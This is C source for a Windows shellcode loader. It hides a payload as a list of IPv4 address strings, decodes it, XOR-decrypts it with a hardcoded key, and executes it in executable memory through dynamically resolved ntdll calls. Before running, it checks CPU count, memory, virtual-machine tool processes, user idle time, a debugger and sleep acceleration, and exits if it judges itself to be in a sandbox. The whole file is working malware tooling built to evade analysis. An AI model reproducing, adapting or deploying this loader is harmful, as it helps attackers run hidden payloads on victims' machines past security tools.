#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>

char* ipv4_array[] = {"145.49.240.129","147.154.169.116","107.101.56.60","56.35.55.50","58.84.166.61","0.49.230.43","19.45.232.32","125.60.224.55","89.37.118.196","47.41.63.84","189.35.238.11","61.49.66.165","207.78.4.8","105.73.89.44","184.186.104.34","115.164.150.134","55.56.60.49","248.55.67.249","39.72.35.100","169.11.248.11","125.104.112.106","241.25.101.121","109.242.243.237","99.114.101.60","238.165.13.10","49.114.181.39","249.37.84.59","44.120.189.242","59.125.128.36","45.139.162.40","72.164.56.248","81.235.58.100","162.35.84.185","44.184.186.104","207.51.100.181","83.133.12.156","53.112.41.71","122.32.77.186","16.161.53.61","248.37.71.59","100.164.13.36","242.97.49.55","238.35.110.44","117.187.36.242","105.241.59.100","179.51.61.53","51.59.32.55","56.43.36.58","51.63.60.232","137.89.44.43","140.133.59.51","60.46.35.238","107.132.50.140","154.156.47.44","202.28.22.75","50.74.65.101","99.51.51.61","226.131.49.236","149.211.100.99","114.44.253.142","44.197.111.121","98.57.163.218","122.14.42.49","48.228.157.63","236.146.51.223","56.28.67.126","146.172.63.236","137.26.100.117","107.101.32.44","195.90.229.8","114.154.161.1","111.56.51.41","35.40.82.187","40.69.171.45","134.173.49.250","167.43.141.165","60.226.164.56","215.147.124.186","131.141.176.60","226.162.19.125","56.43.41.234","144.45.253.146","36.195.244.220","7.4.156.167","224.180.31.111","48.146.183.6","128.139.225.101","116.107.45.250","129.105.59.236","129.63.84.189","1.97.56.53","49.250.156.34","200.103.173.163","58.134.184.250","139.101.29.39","45.247.175.69","39.228.143.25","37.34.43.13","116.123.101.121","44.33.59.236","145.58.84.189","42.223.33.201","42.150.154.182","58.236.183.34","236.190.32.72","186.44.234.130","45.253.177.45","240.148.56.201","103.186.186.58","139.190.230.129","109.4.91.61","34.37.60.28","107.37.121.109","56.43.15.99","40.36.206.96","74.118.93.134","166.50.58.51","223.1.5.40","24.146.172.58","154.173.155.89","139.148.154.49","108.186.59.76","165.58.224.130","30.209.56.146","158.43.15.99","43.44.179.169","149.204.207.47","140.176.0.0"};

#define IPV4_COUNT (sizeof(ipv4_array) / sizeof(ipv4_array[0]))
#define RANDOM_SIZE_0x7F 510

BOOL check_cpu_cores() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return (sysInfo.dwNumberOfProcessors <= 2);
}

BOOL check_memory_size() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    return (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024);
}

BOOL check_vm_processes() {
    const char* vm_processes[] = {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", "xenservice.exe"
    };

    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        for (DWORD i = 0; i < cbNeeded / sizeof(DWORD); i++) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess) {
                char processName[MAX_PATH];
                if (GetModuleBaseNameA(hProcess, NULL, processName, MAX_PATH)) {
                    for (int j = 0; j < sizeof(vm_processes) / sizeof(vm_processes[0]); j++) {
                        if (strcmp(processName, vm_processes[j]) == 0) {
                            CloseHandle(hProcess);
                            return TRUE;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return FALSE;
}

BOOL check_user_interaction() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD idle_time = (GetTickCount() - lii.dwTime) / 1000;
        return (idle_time > 300);
    }
    return FALSE;
}

BOOL check_debugger() {
    return IsDebuggerPresent();
}

BOOL check_time_acceleration() {
    // 检测时间加速 - 沙箱环境通常会加速执行
    DWORD start_time = GetTickCount();
    Sleep(5000);  // 理论睡眠5秒
    DWORD actual_time = GetTickCount() - start_time;
    // 如果实际睡眠时间少于4秒(4000ms)，说明存在时间加速
    return (actual_time < 4000);
}

BOOL is_sandbox() {
    int score = 0;
    if (check_cpu_cores()) score++;
    if (check_memory_size()) score++;
    if (check_vm_processes()) score++;
    if (check_user_interaction()) score++;
    if (check_debugger()) score++;
    if (check_time_acceleration()) score++;  // 新增时间延迟检测
    return (score >= 3);
}

LONG WINAPI VEHHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void decrypt_random_data(unsigned char* random_data, size_t size, const char* key, size_t key_size) {
    for (size_t i = 0; i < size; i++) {
        random_data[i] ^= (unsigned char)key[i % key_size];
    }
}

void deobfuscate_ipv4(unsigned char* random_data, size_t size) {
    size_t offset = 0;
    for (size_t i = 0; i < IPV4_COUNT && offset < size; i++) {
        unsigned char a, b, c, d;
        sscanf(ipv4_array[i], "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
        random_data[offset] = a;
        if (offset + 1 < size) random_data[offset + 1] = b;
        if (offset + 2 < size) random_data[offset + 2] = c;
        if (offset + 3 < size) random_data[offset + 3] = d;
        offset += 4;
    }
}

int main() {
    if (is_sandbox()) {
        ExitProcess(0);
    }

    AddVectoredExceptionHandler(1, VEHHandler);

    unsigned char* random_buffer = (unsigned char*)VirtualAlloc(NULL, RANDOM_SIZE_0x7F, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!random_buffer) return 0;

    deobfuscate_ipv4(random_buffer, RANDOM_SIZE_0x7F);

    const char* key = "mysecretkey";
    decrypt_random_data(random_buffer, RANDOM_SIZE_0x7F, key, strlen(key));

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");

    void* exec_mem = NULL;
    SIZE_T mem_size = RANDOM_SIZE_0x7F;
    pNtAllocateVirtualMemory(GetCurrentProcess(), &exec_mem, 0, &mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    pNtWriteVirtualMemory(GetCurrentProcess(), exec_mem, random_buffer, RANDOM_SIZE_0x7F, NULL);

    HANDLE hThread = NULL;
    pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, GetCurrentProcess(), exec_mem, NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(random_buffer, 0, MEM_RELEASE);
    return 0;
}